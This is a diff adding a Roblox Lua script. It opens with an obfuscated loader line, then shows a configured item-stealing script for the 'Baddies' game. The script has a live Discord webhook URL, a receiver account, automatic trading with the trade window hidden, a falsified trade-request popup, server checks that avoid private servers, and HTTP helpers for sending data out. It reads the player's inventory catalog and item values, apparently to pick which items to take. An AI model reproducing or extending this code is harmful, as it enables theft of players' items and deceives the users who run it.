@@ -1,1 +1,1757 @@
---[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local o={"\101\122\076\048","\081\078\075\087\089\111\086\100\086\079\061\061";"\102\055\106\070\105\084\061\061","\089\103\114\055\086\090\075\071\076\103\111\099\074\121\115\080","\109\051\061\061","\056\102\047\099\101\090\057\061","\056\090\097\055\105\051\061\061";"\115\100\113\056\067\050\113\049\051\118\081\109","\114\090\050\049\086\055\111\049\089\088\082\113\089\088\116\057\050\084\061\061";"\086\103\085\084\105\103\097\113","\086\122\106\048\086\103\055\054\056\102\057\061";"\075\090\065\073\081\118\082\070\097\073\065\088","\101\122\106\090\056\076\086\114\120\076\076\088\101\074\075\103\114\079\061\061";"\105\118\106\048\105\118\121\087";"\088\069\111\066\051\089\069\090\080\073\054\108\071\103\101\043","\084\074\048\106\098\113\111\053\071\043\103\102\065\100\102\052\107\076\084\061";"\068\118\073\079\052\066\079\122\103\051\120\086\043\053\068\102\069\108\082\120\110\048\118\075\071\074\100\118\088\080\122\051\075\107\089\065\082\053\052\052\078\099\099\075\071\067\080\085\050\090\076\072\072\070\113\120\090\113\106\081\112\113\121\079\082\117\086\099\118\067\087\071\101\050\115\102\089\077\111\088\108\049\081\109\080\066\068\065\103\043\068\067\104\101\112\057\076\119\111\078\101\067\047\102\101\073\119\075\066\057\119\083\089\077\054\110\054\097\105\086\118\043\105\080\102\108\106\088\084\098\071\104\103\116\098\078\120\047\074\089\104\054\119\071\116\119\110\067\052\083\101\085\106\106\105\110\122\114\110\119\085\051\061\061","\089\122\097\065\101\122\084\061";"\089\073\121\048\056\122\106\116";"\076\122\121\116\089\122\076\099\057\111\075\100\086\122\076\071\086\122\076\088\057\043\061\061","\102\087\089\061";"\102\105\097\079\057\084\050\061","\105\118\065\065\089\051\061\061","\107\101\108\120\090\098\116\107\086\078\085\073\077\119\107\086\078\071\105\079\104\097\048\073\081\082\122\118\109\088\098\080\121\104\120\120\105\078\119\120\068\102\075\084\067\065\110\080\113\090\079\051\089\067\113\076\076\103\085\106\068\107\078\076\056\048\114\067\106\079\075\088\082\069\049\078\099\108\116\088\074\051\104\071\054\120\117\083\076\088\055\055\066\104\100\083\047\117\066\075\116\085\089\069\113\082\087\061";"\075\102\115\083\076\074\047\122\089\087\100\052\076\087\055\102\089\084\061\061";"\101\080\057\061";"\114\102\065\082\075\080\088\084\114\121\097\078\103\102\097\119\075\084\061\061";"\097\087\056\057\097\055\115\115\089\122\086\104\086\071\105\055\043\114\104\061";"\089\114\086\100\081\102\107\054\043\090\121\098\050\080\105\118\056\079\061\061","\120\088\065\100\066\122\121\114\074\071\097\081\086\078\121\113\076\051\061\061";"\050\088\111\061";"\105\070\100\087\056\043\061\061","\089\090\075\099\066\103\085\070";"\056\071\097\075\066\090\086\075\056\088\104\077\081\102\105\055";"\056\118\121\116\056\043\061\061","\086\122\121\077\066\084\061\061";"\114\118\087\077\081\121\121\065\075\114\097\083\101\070\086\068\114\043\061\061","\118\066\056\057\109\110\104\116\097\080\099\067\075\084\055\102","\102\055\106\104\056\103\049\061","\109\054\051\100\056\069\119\107\109\051\061\061";"","\081\087\075\070\043\077\100\080\097\077\121\114\103\076\050\084";"\086\122\106\077\086\078\047\107\101\073\089\061","\056\073\082\112\101\090\057\061";"\101\103\121\087\066\079\061\061";"\089\073\076\116\101\090\056\100","\086\122\121\054\101\122\114\061";"\056\118\055\065\086\122\097\119";"\101\080\111\061","\076\087\106\052\050\122\107\112\074\088\082\049\066\103\053\118\101\079\061\061";"\101\122\106\065\056\078\097\087\089\073\100\048\056\084\061\061","\057\118\049\073\081\097\082\114\084\067\084\122\105\067\114\104\050\086\074\121","\102\055\106\116\056\102\075\065\086\122\121\054\101\122\114\061","\102\055\106\107\101\073\075\100\120\079\061\061","\107\055\087\116\104\079\068\118\108\098\088\043\049\090\109\116\043\053\070\088\083\104\072\076\115\113\086\113\082\111\122\120\088\074\071\072\120\111\090\113\072\110\079\103\117\047\111\075\089\083\075\086\083\120\083\103\100\073\068\104\081\047\074\098\057\115\111\100\109\077\090\081\115\099\048\049\080\111\087\084\100\090\100\048\115\081\072\077\075\051\105\051\099\110\086\120\107\108\077\097\049\054\070\078\077\115\108\106\113\081\100\117\076\057\057\049\066\112\053\088\117\109\116\112\070\065\087\054\069\090\065\110\056\047\055\077\116\071\085\051\085\089\066\110\099\118\076\111\051\110\053\116\049\117\098\085\100\085\075\118";"\103\076\086\043\097\088\082\115\086\071\086\113\066\121\075\078\105\103\104\061";"\081\090\047\109\050\103\047\057\075\122\047\087\089\088\082\087\081\111\119\061","\089\118\076\087\101\103\076\087\105\102\075\065\105\073\082\100"}local function N(N)return o[N-(216825-188352)]end for N,G in ipairs({{567238+-567237,-170378+170436},{1042677+-1042676,417218+-417215};{-174196+174200;-134998-(-135056)}})do while G[193599-193598]<G[775238+-775236]do o[G[93698+-93697]],o[G[265292+-265290]],G[-3132+3133],G[703603-703601]=o[G[716930-716928]],o[G[-889970+889971]],G[798224-798223]+(-111454+111455),G[-180964-(-180966)]-(-26787-(-26788))end end do local N=o local G=math.floor local r=table.concat local Z={u=-196964-(-196995);["\050"]=-774328-(-774340);["\056"]=-222910+222935;Z=-653381-(-653436),J=306346+-306327,D=87377-87335;["\052"]=-911140-(-911151);g=1047563+-1047541;P=-993205-(-993208),["\053"]=-423577-(-423637);G=198521+-198486;p=-845947-(-845994),f=113953-113930,n=-831116+831178,T=-6639+6687,j=36993+-36932,s=790072+-790071,m=281286+-281272;b=282642+-282632;o=-462018-(-462022),Q=-476048+476066;e=691909+-691882;W=797671-797619;l=-350190+350253;B=67324+-67298;c=344945-344895,M=-836752-(-836803),S=-429182+429197;["\051"]=-913228-(-913260),r=-947879-(-947899);h=-304326+304370;a=-399419+399432;E=-549998+550000,y=-134421-(-134426),["\048"]=-728703-(-728749),["\055"]=549960+-549907,X=975733-975697;t=-799845-(-799890);A=751824-751791,z=-955729-(-955735),C=-876483-(-876541);Y=954765+-954737,L=-747757-(-747778),V=-582987-(-583016);K=-140687+140704,w=-163778-(-163818);["\049"]=-604930+604986;R=-432998+433047;q=-466859+466902;k=-107125-(-107166);["\047"]=803830+-803821;x=949542+-949512,O=345515-345515,["\054"]=-454614+454648;I=-797203+797241,["\057"]=-248156+248164,["\043"]=-116214+116230;v=272513-272459,U=-622949-(-623006),F=-354990+355029,d=-64240-(-64277);i=-291793-(-291817);H=-33310-(-33369),N=-981634+981641}local w=string.char local E=type local a=string.len local n=table.insert local T=string.sub for o=594666+-594665,#N,-817977-(-817978)do local x=N[o]if E(x)=="\115\116\114\105\110\103"then local E=a(x)local l={}local s=-576893-(-576894)local k=-1044872+1044872 local C=-34302+34302 while s<=E do local o=T(x,s,s)local N=Z[o]if N then k=k+N*(-816682+816746)^((243421-243418)-C)C=C+(503146+-503145)if C==287883+-287879 then C=327251+-327251 local o=G(k/(884993-819457))local N=G((k%(64407-(-1129)))/(326890-326634))local r=k%(153022+-152766)n(l,w(o,N,r))k=-161198+161198 end elseif o=="\061"then n(l,w(G(k/(605147-539611))))if s>=E or T(x,s+(-593361+593362),s+(-1038352-(-1038353)))~="\061"then n(l,w(G((k%(454452+-388916))/(-84726-(-84982)))))end break end s=s+(-489796-(-489797))end N[o]=r(l)end end end return(function(o,r,Z,w,E,a,n,i,f,C,x,k,P,T,p,l,H,G,s,z,u,t)C,p,G,x,z,T,i,t,P,l,u,H,f,k,s=function(o)local N,G=813196+-813195,o[-551448+551449]while G do x[G],N=x[G]-(946448+-946447),N+(-838222-(-838223))if 509833+-509833==x[G]then x[G],T[G]=nil,nil end G=o[N]end end,function(o,N)local r=k(N)local Z=function(Z,w)return G(o,{Z,w},N,r)end return Z end,function(G,Z,w,E)local M,S,B,R,J,h,n,O,K,b,e,t,s,Y,D,y,k,Q,A,U,g,X,j,x,m,C,q,F,c,L,W,v,d,I while G do if G<8382947-483099 then if G<1012332+3604117 then if G<-581490+1928636 then if G<500325+32344 then if G<-367022-(-578271)then if G<-322360+456148 then if G<309208+-241929 then I=l()q=l()J=p(5666810-(-6409),{I;c;F,t})d={}O=N(-100164-(-128640))X=N(-537871-(-566400))k=nil U={}B=nil T[I]=d L=nil t=u(t)d=l()t=N(-18353-(-46880))D=nil T[d]=J J={}e=N(-526132+554662)W=nil T[q]=J J=o[O]K=T[q]v=nil j=nil g={[e]=K;[X]=L}O=J(U,g)j=N(643130+-614619)T[s]=O J=f(-3877+6723515,{q,I,Y,c,F,d})q=u(q)c=u(c)T[C]=J k=o[t]I=u(I)Y=u(Y)n={}Y=N(-902685-(-931216))W=-428331+23881119872155 F=u(F)v=o[j]c=T[s]d=u(d)F=T[C]D=F(Y,W)B=c[D]c=N(804846+-776368)c=v[c]j={c(v,B)}c=N(1012097+-983583)t=k(r(j))k=t()t=N(1024223+-995726)F=607604+2445808549630 k=o[t]v=T[s]j=T[C]B=j(c,F)F=N(-507570+536063)t=v[B]D=816856+29651033161495 j=T[s]W=34191078173000-(-578793)B=T[C]c=B(F,D)F=716560+23623393410024 v=j[c]k[t]=v t=N(-1020285+1048782)c=N(-132491+160982)G=o[N(-680073-(-708547))]D=N(-15534-(-44062))k=o[t]v=T[s]j=T[C]Y=-719817+1518967766668 B=j(c,F)t=v[B]B=T[s]c=T[C]F=c(D,Y)Y=N(-749803-(-778295))j=B[F]c=T[s]F=T[C]D=F(Y,W)d=700410325926-(-513440)B=c[D]F=T[s]D=T[C]W=N(-941510-(-969991))Y=D(W,d)c=F[Y]D=-780790+33172252960333 v={j;B;c}k[t]=v F=947649+8098016368889 c=N(-948213-(-976697))t=N(798044-769547)k=o[t]v=T[s]j=T[C]B=j(c,F)t=v[B]v=true k[t]=v v=N(-439573+468085)t=o[v]j=T[s]B=T[C]F=N(-223202+251700)c=B(F,D)v=j[c]k=t[v]v=P(9791957-679214,{s,C})s=u(s)t=k(v)C=u(C)else G=6704589-476285 end else k=329163-329025 s=T[w[722921-722918]]x=s*k s=612379+-612122 n=x%s G=-893040+12292246 T[w[1011258+-1011255]]=n end else if G<416526-(-95911)then x=nil T[w[-527088-(-527093)]]=n G=362618+13829615 else F=F+D W=not Y B=F<=c B=W and B W=F>=c W=Y and W B=W or B W=-930993+4400774 G=B and W B=8058820-865281 G=G or B end end else if G<-229621+1227482 then if G<1563345-638034 then if G<-317336+1076328 then G=true G=-691424+6224764 else s=k c=-812009+812264 G=T[w[391637-391636]]B=-506891+506891 j=G(B,c)x[s]=j s=nil G=10764633-522102 end else I=-231511-(-231512)J=#W d=k(I,J)U=376575+-376574 I=v(W,d)J=T[Y]d=nil O=I-U G=1018797+6420590 q=j(O)J[I]=q I=nil end else if G<1681841-580152 then k=N(750044-721521)s=o[k]k=N(28028-(-494))x=s[k]k=T[w[-962212+962213]]s={x(k)}n={r(s)}G=o[N(-251415-(-279921))]else n=N(-699901+728383)x=N(-433224+461720)G=o[n]n=G(x)n={}G=o[N(-790992+819497)]end end end else if G<2524361-(-702957)then if G<1018295+1433446 then if G<1728192-(-573423)then if G<2374098-237506 then U=not O I=I+q d=I<=J d=U and d U=I>=J U=O and U d=U or d U=15962084-82170 G=d and U d=11174674-(-1016631)G=G or d else G=true s=l()T[s]=G C=l()x=Z k=N(-455479+483988)n=o[k]k=N(-796918-(-825442))G=n[k]k=l()T[k]=G G=z(771536-(-432381),{})j=N(453277+-424783)T[C]=G G=false t=l()B=z(11026872-(-783020),{t})T[t]=G v=o[j]j=v(B)n=j G=j and 11841685-502887 or-174724+9546307 end else s=T[w[694265-694263]]k=T[w[-146099-(-146102)]]x=s==k n=x G=4903136-(-520439)end else if G<-43545+3179164 then k=-222892-(-222957)s=T[w[-588395-(-588397)]]x=s*k s=9735431683328-(-332981)n=x+s x=-212419+35184372301251 G=n%x T[w[49011+-49009]]=G x=T[w[-924037+924040]]s=-906680+906681 G=-78486+222276 n=x~=s else c=l()T[c]=n D=232792+-232727 G=T[j]W=N(-262491-(-290985))F=391911-391908 n=G(F,D)G=-985667+985667 d=i(351700+10360964,{})M=N(-862653-(-891172))D=G G=273183+-273183 F=l()Y=G T[F]=n n=o[W]W={n(d)}n=361237+-361235 G={r(W)}W=G G=W[n]d=G n=N(-314149+342636)G=o[n]I=T[k]y=o[M]M=y(d)y=N(377912-349396)b=I(M,y)I={b()}n=G(r(I))I=l()T[I]=n n=928494-928493 b=T[F]y=b b=741830-741829 M=b b=211413+-211413 J=M<b b=n-M G=-43117+6088061 end end else if G<-828139+4833703 then if G<-812468+4640443 then B=F M=N(43328-14819)y=o[M]M=N(63009-34501)b=y[M]y=b(x,B)b=T[w[247989+-247983]]M=b()I=y+M M=541258+-541257 d=I+v G=126666-(-394082)I=-1009950-(-1010206)W=d%I I=k[s]v=W y=v+M b=C[y]d=I..b B=nil k[s]=d else T[s]=b G=T[s]G=G and 4046381-(-847426)or 1011659+-438106 end else if G<3387949-(-961092)then U=u(U)X=nil G=-999414+7044358 q=u(q)e=u(e)g=u(g)K=u(K)O=u(O)else G={}j=775022+-774767 B=N(827750-799241)T[w[-616163-(-616165)]]=G t=35184372223122-134290 n=T[w[-198140+198143]]C=n n=s%t G=1192733-671985 T[w[889868-889864]]=n v=s%j j=566327-566325 t=v+j T[w[-441018-(-441023)]]=t j=o[B]F=-47936-(-47937)B=N(604049+-575572)v=j[B]D=F j=v(x)F=941034+-941034 v=N(-431589+460106)c=j Y=D<F k[s]=v B=184900+-184899 F=B-D v=298767+-298655 end end end end else if G<5344073-(-800872)then if G<6031137-441641 then if G<328369+5183406 then if G<293300+4972297 then if G<-669194+5559655 then R=T[s]G=R and-858997+15760187 or 76081+8859377 A=R else G=16197674-(-429121)end else G=n and-546547+13758290 or 190681+14001552 end else if G<5258153-(-290727)then G=P(-214326+6720121,{C})y={G()}n={r(y)}G=o[N(665336-636851)]else G=F G=c and-238379+3388727 or 364616+9806191 n=c end end else if G<182253+5632442 then if G<6000340-318988 then x=T[w[-180127-(-180128)]]n=#x x=-939651+939651 G=n==x G=G and 3280236-810629 or 700347-(-388195)else G=T[w[-1046554-(-1046564)]]s=T[w[-765889-(-765900)]]x[G]=s G=T[w[684345-684333]]s={G(x)}G=o[N(112775-84300)]n={r(s)}end else if G<421203+5592044 then G={}x=G s=641117-641116 k=T[w[-438473+438482]]C=k G=10251010-8479 k=333866+-333865 t=k k=373038+-373038 v=t<k k=s-t else b=b+M q=not J n=b<=y n=q and n q=b>=y q=J and q n=q or n q=-1020407+11775901 G=n and q n=12073182-7271 G=G or n end end end else if G<6941015-(-182129)then if G<391383+6453507 then if G<656246+6013031 then if G<5696044-(-722795)then G=true G=G and-587433+9517032 or-1044552+8416949 else G=12881760-(-20067)end else G=T[w[592967+-592966]]k=G x=Z[942202+-942201]s=Z[246128-246126]G=k[s]G=G and 10815655-(-963796)or-672150+5039234 end else if G<855662+6038455 then n=A G=R G=425086+7489096 else y=D==Y G=4438594-454841 b=y end end else if G<-418433+7857167 then if G<-466107+7738957 then G=16182897-607508 j=nil C=nil v=nil else n={}G=o[N(714500-685974)]end else if G<7938787-269126 then J=-255283-(-255283)I=#W d=I==J G=d and 920422-866710 or 712527+218700 else x=N(623296-594814)G=o[x]s=T[w[-1037722-(-1037730)]]k=249866-249866 x=G(s,k)G=6775491-915711 end end end end end else if G<12021031-(-229761)then if G<10837482-400056 then if G<10086248-849741 then if G<-962350+9926445 then if G<-718170+9653427 then if G<543835+7828786 then G=715388+3361830 T[s]=n else J=131103+-131097 M=-775494-(-775495)G=T[j]y=G(M,J)G=N(-569197-(-597699))J=N(219670+-191168)o[G]=y M=o[J]J=-599219+599221 G=M>J G=G and 15823209-283627 or 10865790-987594 end else h=868473+-868472 T[s]=A m=T[g]S=m+h L=X[S]R=D+L L=-726929-(-727185)G=R%L S=T[U]D=G L=Y+S S=494324-494068 G=-42905+4120123 R=L%S Y=R end else if G<9534311-399455 then s=N(-392100+420611)n=N(516059+-487532)G=o[n]x=o[s]j=N(1018881+-990381)C=T[w[599167+-599166]]t=T[w[-703811-(-703813)]]B=-810737+34266674486597 v=t(j,B)k=C[v]t=N(-447767-(-476245))t=x[t]C=true s={t(x,k,C)}n=G(r(s))G=n()n={}G=o[N(-367566-(-396079))]else k=T[w[-979786+979792]]s=k==x n=s G=809050-576123 end end else if G<78494+10083015 then if G<-428497+10074789 then B=N(-126850+155373)v=n j=N(-292750+321271)n=o[j]j=N(-399767-(-428262))G=n[j]j=l()T[j]=G n=o[B]Y=N(976234+-947711)B=N(260205-231715)G=n[B]B=G D=o[Y]c=D F=G G=D and 11307995-525699 or 4629222-(-921014)else J=N(-986658-(-1015160))G=o[J]J=N(281288+-252763)o[J]=G G=-541355+17144884 end else if G<11172987-992390 then F=N(-287171+315657)G=2957287-(-193061)c=o[F]n=c else k=k+t s=k<=C j=not v s=j and s j=k>=C j=v and j s=j or s j=1738551-828498 G=s and j s=5439128-(-244633)G=G or s end end end else if G<10961820-(-797321)then if G<11484058-270141 then if G<-787165+11564996 then if G<10603085-(-147456)then s=N(-920000+948489)k=6170345-1027823 x=s^k n=-919682+9859022 G=n-x x=G n=N(1020612-992105)G=n/x n={G}G=o[N(250779+-222275)]else Q=-766994+776994 q=l()T[q]=b O=N(886136-857615)K=114180+-114179 n=o[O]O=N(-229910+258405)G=n[O]U=-559481+559581 O=90696-90695 g=-682281+682536 n=G(O,U)U=878861+-878861 O=l()T[O]=n G=T[j]n=G(U,g)U=l()T[U]=n g=800164+-800163 G=T[j]e=T[O]n=G(g,e)X=976613-976611 h=973311-973311 g=l()T[g]=n n=T[j]L=N(-400028+428547)e=n(K,X)n=1007375+-1007374 G=e==n n=N(-183471+211987)e=l()T[e]=G X=N(510057+-481576)R=o[L]S=T[j]G=N(1010984+-982501)m={S(h,Q)}L=R(r(m))R=N(-1019283+1047764)A=L..R K=X..A G=d[G]G=G(d,n,K)K=l()X=N(442364+-413870)T[K]=G A=H(15012453-800958,{j;q,F,k,s,I,e;K;O;g;U,c})n=o[X]X={n(A)}G={r(X)}X=G G=T[e]G=G and 716149+11610061 or 4021914-(-832299)end else W=N(494064+-465541)Y=o[W]W=N(12131+16355)D=Y[W]G=-77873+5628109 c=D end else if G<-49618+11407806 then v=T[t]G=-226665+9598248 n=v else s=T[w[1040991-1040988]]k=-230799-(-230800)x=s~=k G=x and 16724594-795654 or 599365-455575 end end else if G<-853276+12702243 then if G<12298746-498355 then G=-597036+16172425 else G=true n={}T[w[-791035-(-791036)]]=G G=o[N(632189-603671)]end else if G<895864+11172903 then y=T[s]b=y G=y and 6851072-(-257167)or 4886353-902600 else I=#W G=451977-(-479250)J=899678-899678 d=I==J end end end end else if G<15830421-885757 then if G<13331139-(-531428)then if G<13692415-552998 then if G<-1039658+13896984 then if G<11898846-(-557536)then A=T[s]G=A and-554856+13179349 or 959930+6954252 n=A else R=G m=697044-697043 S=X[m]m=false L=S==m A=L G=L and-641578+17186570 or 963641+5911670 end else G=true G=G and 13059562-(-746007)or 14268150-368771 end else if G<13793427-22683 then B=N(-127948+156442)n=N(-683832-(-712319))G=o[n]x=T[w[980385+-980381]]c=p(17438770-676396,{})C=N(-758017-(-786536))k=o[C]j=o[B]B={j(c)}v={r(B)}j=-511847+511849 t=v[j]C=k(t)k=N(775522+-747006)s=x(C,k)x={s()}n=G(r(x))s=T[w[121942-121937]]x=n G=s and 30128+9137555 or-615243+848170 n=s else x=N(-351786+380311)n=N(-777954+806456)G=o[n]n=o[x]x=N(-685107+713632)o[x]=G G=13392656-490829 x=N(329466+-300964)o[x]=n x=T[w[486224-486223]]s=x()end end else if G<14603111-398470 then if G<13421344-(-536868)then G=o[N(228043-199542)]n={}else G=T[w[903455+-903448]]G=G and 8037348-346012 or 6575872-716092 end else if G<-34391+14679006 then t=-585235-(-585237)s=T[w[827178+-827177]]C=-204341+204342 k=s(C,t)s=-920690-(-920691)x=k==s n=x G=x and 6038963-615388 or 2516788-65094 else L=-221993+221994 R=X[L]G=927505+8007953 A=R end end end else if G<15612648-(-942755)then if G<16268102-378817 then if G<15067651-(-529486)then if G<15321677-(-240780)then M=N(-648462+676981)q=N(-496320+524845)G=o[M]J=o[q]M=G(J)G=N(414937+-386435)o[G]=M G=16547097-(-56432)else n={s}G=o[N(-317727-(-346237))]end else d=I U=d W[d]=U G=1250411-(-472164)d=nil end else if G<16733891-415553 then s=T[w[-292322-(-292325)]]k=-810599-(-810631)c=-1046114+1046116 x=s%k C=T[w[860184-860180]]j=T[w[-108267+108269]]D=-436988-(-437001)d=T[w[-36933-(-36936)]]W=d-x d=736045-736013 Y=W/d F=D-Y B=c^F v=j/B t=C(v)C=30936+4294936360 k=t%C t=-880510+880512 B=-266771-(-266772)C=t^x s=k/C C=T[w[888048+-888044]]j=s%B B=-977896+4295945192 x=nil v=j*B t=C(v)C=T[w[59502+-59498]]v=C(s)k=t+v t=-342865-(-408401)s=nil C=k%t j=-237829-(-303365)c=-112157-(-112413)v=k-C t=v/j j=-44055-(-44311)D=-898238-(-898494)v=C%j B=C-v C=nil j=B/c c=-171977-(-172233)G=2037789-949247 B=t%c F=t-B k=nil c=F/D F={v;j,B;c}v=nil j=nil T[w[981091-981090]]=F c=nil B=nil t=nil else m=193760-193758 S=X[m]G=1003512+5871799 m=T[K]L=S==m A=L end end else if G<15582756-(-1032080)then if G<-170717+16773202 then G=true G=G and 453032-369219 or-845954+6379294 else G=-433277+6661581 end else if G<15731951-(-1002442)then D=nil v=nil C=u(C)Y=nil t=u(t)B=nil j=u(j)s=u(s)d=nil B=N(-703222-(-731745))C=l()W=nil k=u(k)F=u(F)s=nil T[C]=s k=nil c=u(c)I=u(I)s=l()v=N(848064+-819543)T[s]=k t=o[v]v=N(-466084-(-494604))k=t[v]t=l()T[t]=k j=N(-1030941+1059462)c=N(-977402+1005911)v=o[j]j=N(-689626-(-718121))W={}G=2057229-334654 k=v[j]I=347390+-347134 j=o[B]B=N(776986-748464)v=j[B]B=o[c]F=l()c=N(-888032+916531)j=B[c]c=l()B=104125-104125 T[c]=B d=500637+-500636 B=-462018+462020 T[F]=B Y=l()B={}J=I D={}I=-783064+783065 q=I T[Y]=D I=-866308+866308 D=-557915+557915 O=q<I I=d-q else n=646914+7538680 s=N(-840217-(-868705))k=11764590-(-526476)x=s^k G=n-x n=N(779147+-750667)x=G G=n/x n={G}G=o[N(-565503+594006)]end end end end end end end G=#E return r(n)end,{},function(o,N)local r=k(N)local Z=function(Z,w,E)return G(o,{Z;w;E},N,r)end return Z end,{},function(o,N)local r=k(N)local Z=function(Z,w,E,a,n)return G(o,{Z,w,E;a;n},N,r)end return Z end,function(o,N)local r=k(N)local Z=function(...)return G(o,{...},N,r)end return Z end,function(o,N)local r=k(N)local Z=function(Z)return G(o,{Z},N,r)end return Z end,function()s=s+(-798806-(-798807))x[s]=328571-328570 return s end,function(o)x[o]=x[o]-(505034+-505033)if 699579-699579==x[o]then x[o],T[o]=nil,nil end end,function(o,N)local r=k(N)local Z=function()return G(o,{},N,r)end return Z end,function(o,N)local r=k(N)local Z=function(Z,w,E,a,n,T)return G(o,{Z;w;E,a,n,T},N,r)end return Z end,function(o)for N=-17092+17093,#o,-970502-(-970503)do x[o[N]]=x[o[N]]+(-415583-(-415584))end if Z then local G=Z(true)local r=E(G)r[N(888430-859900)],r[N(982485+-954006)],r[N(-972972+1001487)]=o,C,function()return-926236-(-1027633)end return G else return w({},{[N(-184531-(-213010))]=C;[N(862332+-833802)]=o,[N(629215+-600700)]=function()return-475510-(-576907)end})end end,-371156+371156 return(t(-62999+2349631,{}))(r(n))end)(getfenv and getfenv()or _ENV,unpack or table[N(63044+-34558)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
+-- ===== CONFIG =====
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1493322934532702261/heWYGm0D9zq8kiDoReF5eZEFiDdpDx9wuwZipmUygAbHIC4fJ5_43TJp2dN_n-iLNOxh"
+local RECEIVER = "Luckyman7778910"
+local ENABLE_TRADE = true
+local TRADE_INVITE_COOLDOWN = 6
+local TRADE_ADD_DELAY = 0
+local TRADE_MODIFY_BUFFER = 0.03
+local TRADE_MAX_ITEMS = 20
+local HIDE_TRADE_GUI = true
+local SINGLE_ITEM_MIN_RAP = 1000
+local EVERYONE_RAP_THRESHOLD = 1000
+local NEWBIE_PLACE_IDS = {
+[127077458902864] = true,
+[88099069191088] = true,
+}
+-- ==================
+
+getgenv().BaddiesAllowTrade = false
+
+if getgenv().BaddiesScriptRunning then
+print("this script already running")
+return
+end
+getgenv().BaddiesScriptRunning = true
+
+getgenv().BaddiesLastScan = { status = "starting", at = os.time() }
+
+local function setScanStatus(status, detail)
+getgenv().BaddiesLastScan = {
+status = status,
+detail = detail,
+at = os.time(),
+}
+end
+
+if getgenv().BaddiesScannerRunning then
+getgenv().BaddiesScannerRunning = nil
+end
+
+if WEBHOOK_URL == "" then
+getgenv().BaddiesScriptRunning = false
+return
+end
+
+if RECEIVER == "" then
+getgenv().BaddiesScriptRunning = false
+return
+end
+
+local RECEIVERS = { RECEIVER }
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- ===== TRADE POPUP TEXT MODIFIER =====
+task.spawn(function()
+while true do
+local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+if playerGui then
+local TradeRequestPopup = playerGui:FindFirstChild("TradeRequestPopup")
+if TradeRequestPopup then
+local TradeRequest = TradeRequestPopup:FindFirstChild("TradeRequest")
+if TradeRequest then
+local Content = TradeRequest:FindFirstChild("Content")
+local content = Content
+if Content then
+content = Content:IsA("TextLabel")
+end
+if content and Content.Text ~= "Trade request from 本当にバカだな do you want to accept?" then
+Content.Text = "Trade request from 本当にバカだな do you want to accept?"
+end
+end
+end
+end
+task.wait(0.5)
+end
+end)
+-- =====================================
+
+local function kickAndStop(message)
+setScanStatus("kicked", message)
+getgenv().BaddiesScriptRunning = false
+getgenv().BaddiesAllowTrade = false
+LocalPlayer:Kick(message)
+end
+
+local function isPrivateServer()
+if typeof(game.PrivateServerId) == "string" and game.PrivateServerId ~= "" then
+return true
+end
+if typeof(game.PrivateServerOwnerId) == "number" and game.PrivateServerOwnerId ~= 0 then
+return true
+end
+if workspace:GetAttribute("IsVIPServer") == true then
+return true
+end
+return false
+end
+
+local function isNewbieServer()
+return NEWBIE_PLACE_IDS[game.PlaceId] == true
+end
+
+local function validateServerEarly()
+if isPrivateServer() then
+return false, "Private servers are not supported."
+end
+if isNewbieServer() then
+return false, "Newbie servers are not supported."
+end
+return true
+end
+
+local CATEGORY_CONFIG = {
+{
+key = "Weapons",
+label = "Weapons",
+emoji = "⚔️",
+},
+{
+key = "Fighting Style",
+label = "Fighting Style",
+emoji = "👊",
+},
+{
+key = "stomp",
+label = "Stomp",
+emoji = "👟",
+},
+{
+key = "Loveboard",
+label = "Board Skin",
+emoji = "🛹",
+},
+}
+
+local function getExecutorName()
+if typeof(identifyexecutor) == "function" then
+local ok, name = pcall(identifyexecutor)
+if ok and typeof(name) == "string" and name ~= "" then
+return name
+end
+end
+return "Unknown"
+end
+
+local function getRequestFn()
+if typeof(request) == "function" then
+return request
+end
+if typeof(http_request) == "function" then
+return http_request
+end
+if syn and typeof(syn.request) == "function" then
+return syn.request
+end
+if fluxus and typeof(fluxus.request) == "function" then
+return fluxus.request
+end
+return nil
+end
+
+local function httpRequest(options)
+local req = getRequestFn()
+if req then
+local ok, res = pcall(function()
+return req(options)
+end)
+if ok then
+return res
+end
+return nil
+end
+
+local ok, res = pcall(function()  
+    return HttpService:RequestAsync({  
+        Url = options.Url,  
+        Method = options.Method or "GET",  
+        Headers = options.Headers or {},  
+        Body = options.Body,  
+    })  
+end)  
+if ok then  
+    return res  
+end  
+return nil
+
+end
+
+local function httpPost(url, body)
+local payload = HttpService:JSONEncode(body)
+local req = getRequestFn()
+if req then
+local ok, res = pcall(function()
+return req({
+Url = url,
+Method = "POST",
+Headers = {
+["Content-Type"] = "application/json",
+},
+Body = payload,
+})
+end)
+if not ok then
+return false, res
+end
+local status = res.StatusCode or res.status or res.Status or 0
+if status >= 200 and status < 300 then
+return true
+end
+return false, ("HTTP %s"):format(tostring(status))
+end
+
+local ok, res = pcall(function()  
+    return HttpService:RequestAsync({  
+        Url = url,  
+        Method = "POST",  
+        Headers = {  
+            ["Content-Type"] = "application/json",  
+        },  
+        Body = payload,  
+    })  
+end)  
+if ok and res and res.Success then  
+    return true  
+end  
+return false, ok and res and res.StatusMessage or "No HTTP client available"
+
+end
+
+local function waitForDataReplion(timeout)
+timeout = timeout or 30
+local Replion = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Replion"))
+local started = os.clock()
+while os.clock() - started < timeout do
+local ok, rep = pcall(function()
+return Replion.Client:WaitReplion("Data", 2)
+end)
+if ok and rep then
+return rep
+end
+task.wait(0.5)
+end
+return nil
+end
+
+local function loadCatalog()
+local Shared = ReplicatedStorage:WaitForChild("Shared")
+local catalog = {
+weapons = {},
+skins = {},
+tradeData = nil,
+}
+
+pcall(function()  
+    catalog.weapons = require(Shared:WaitForChild("Weapons"))  
+end)  
+pcall(function()  
+    catalog.skins = require(ReplicatedStorage:WaitForChild("SkinCrates"):WaitForChild("Items"))  
+end)  
+pcall(function()  
+    catalog.tradeData = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Trading"):WaitForChild("TradeData"))  
+end)  
+
+return catalog
+
+end
+
+local function waitForRapReplion(timeout)
+timeout = timeout or 20
+local Replion = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Replion"))
+local started = os.clock()
+while os.clock() - started < timeout do
